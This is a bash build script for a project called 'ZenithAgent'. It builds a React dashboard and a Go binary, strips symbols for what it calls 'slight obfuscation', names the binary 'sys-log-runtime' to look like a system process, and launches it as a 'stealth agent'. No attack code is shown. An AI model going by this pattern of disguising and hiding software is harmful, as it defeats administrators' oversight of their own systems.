#!/bin/bash

echo "=== Building ZenithAgent ===" 

# Build React Dashboard
if [ -d "dashboard" ]; then
    echo "Building React dashboard..."
    cd dashboard
    if command -v npm &> /dev/null; then
        npm install --silent
        npm run build
        if [ $? -eq 0 ]; then
            echo "✓ React dashboard built successfully"
        else
            echo "⚠️  React build failed, continuing with Go build..."
        fi
    else
        echo "⚠️  npm not found, skipping React build"
    fi
    cd ..
else
    echo "⚠️  Dashboard directory not found, skipping React build"
fi

# Build Go Binary with ldflags to strip symbols (-s -w) for smaller binary and slight obfuscation
echo "Building Go binary..."
if command -v go &> /dev/null; then
    go mod tidy
    go build -ldflags="-s -w" -o sys-log-runtime cmd/agent/main.go
else
    echo "Error: 'go' command not found. Please install Go."
    exit 1
fi

if [ -f "./sys-log-runtime" ]; then
    echo "✓ Build successful. Launching stealth agent..."
    ./sys-log-runtime
else
    echo "Build failed."
    exit 1
fi
